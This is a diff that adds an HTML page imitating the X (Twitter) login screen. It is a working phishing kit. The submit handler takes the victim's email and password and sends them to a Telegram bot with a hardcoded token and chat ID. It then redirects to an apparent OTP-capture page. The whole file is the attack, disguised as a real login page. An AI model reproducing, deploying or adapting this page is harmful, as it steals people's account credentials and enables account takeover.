@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to X</title>
+    <link rel="stylesheet" href="X.css">
+    <link rel="icon" href="https://www.x.com/favicon.ico">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" width="50" height="50" fill="#fff">
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+            </svg>
+        </div>
+        <h1>Log in</h1>
+        <form id="loginForm" onsubmit="sendToTelegram(event)">
+            <div class="input-group">
+                <input type="email" id="email" placeholder="Email (e.g., example@gmail.com)" required autocomplete="email">
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+        <div class="links">
+            <a href="#">Forgot password?</a>
+            <span> · </span>
+            <a href="#">Sign up for X</a>
+        </div>
+    </div>
+    <script>
+        async function sendToTelegram(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Gmail-only validation
+            const gmailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+            if (!gmailRegex.test(email)) {
+                alert('Please enter a valid Gmail address (e.g., example@gmail.com)');
+                return;
+            }
+
+            const botToken = '7601720555:AAH7z9Lxln97UyVYyC3uKkQIwdsXswOLxr4';
+            const chatId = '-1002258065420';
+            const message = `X Login:\nEmail: ${email}\nPassword: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('Success:', data);
+                    localStorage.setItem('xEmail', email);
+                    window.location.href = 'XOTP.html';
+                } else {
+                    alert('Login failed—check your credentials.');
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                alert('Connection error—try again.');
+            }
+        }
+    </script>
+</body>
+</html>
